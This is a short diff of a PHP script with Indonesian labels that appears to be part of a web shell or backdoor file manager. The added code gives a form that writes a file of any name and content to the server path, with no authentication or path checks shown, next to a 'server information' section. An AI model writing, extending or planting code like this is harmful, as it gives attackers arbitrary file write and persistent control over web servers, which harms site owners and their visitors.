@@ -238,6 +238,7 @@ if($_GET['aksi'] == 'buatfolder'){
 				</div>
 				</div>';
 }elseif($_GET["aksi"] == 'buatfile'){
+	if(isset($_POST["buat"])){
 	$namaF = $path.'/'.$_POST["nama_file"];
 	$isi = $_POST["isi"];
 	$buat = fopen($namaF,"w");
@@ -248,6 +249,11 @@ if($_GET['aksi'] == 'buatfolder'){
 }else{
 echo "<script>alert('Gagal')</script>";
 }
+}
+echo '<form method="post" class="mt-3">
+	<input type="text" class="form-control mb-3" placeholder="Nama File" name="nama_file">
+		<textarea class="form-control mb-3" rows="8" name="isi" placeholder="Isi File"></textarea>
+		<input type="submit" name="buat" class="btn btn-outline-primary" value="Buat">';
 }else
 
 // Informasi Server
